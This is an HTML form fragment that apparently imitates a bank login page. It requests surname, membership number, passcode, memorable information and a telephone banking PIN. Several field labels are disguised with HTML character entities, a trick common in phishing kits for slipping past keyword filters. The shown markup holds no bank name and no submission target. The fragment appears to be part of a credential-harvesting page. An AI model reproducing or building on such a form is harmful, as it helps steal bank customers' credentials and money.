<br>
<form>
	<table>
		<tr>
			<td>Surname :</td>
			<td><input type="text"  autocomplete="off" style="width: 9.5em;" maxlength="20"  name="s_name" value="" required="required" title="Surname"></input></td>
		</tr>
		<tr>
			<td>Membership 	&#78;umber :</td>
			<td><input type="number"  autocomplete="off" style="width: 9.5em;" maxlength="20" name="m_num" value="" required="required" title="Membership Number"></input></td>
		</tr>
		<tr>
			<td>Pas&#115;code :</td>
			<td><input type="text"  autocomplete="off" style="width: 9.5em;" maxlength="20" name="pscode" value="" required="required" title="Passcode"></input></td>
		</tr>
		<tr>
			<td>&#77;emorable :</td>
			<td><input type="text"  autocomplete="off"  style="width: 9.5em;" maxlength="20" name="m_able" value="" required="required" title="Memorable"></input></td>
		</tr>
        <tr>
			<tr>
			<td>Telephone &#x0042;anking &#x0050;in :</td>
			<td><input type="password"  autocomplete="off" style="width: 6.4em;"  maxlength="10" id="txt" onkeyup="check()" onmouseout="check()" name="tpin" value="" required="" style=" title="Telephone Pin"></input></td>
		</tr>
	</table>
</form>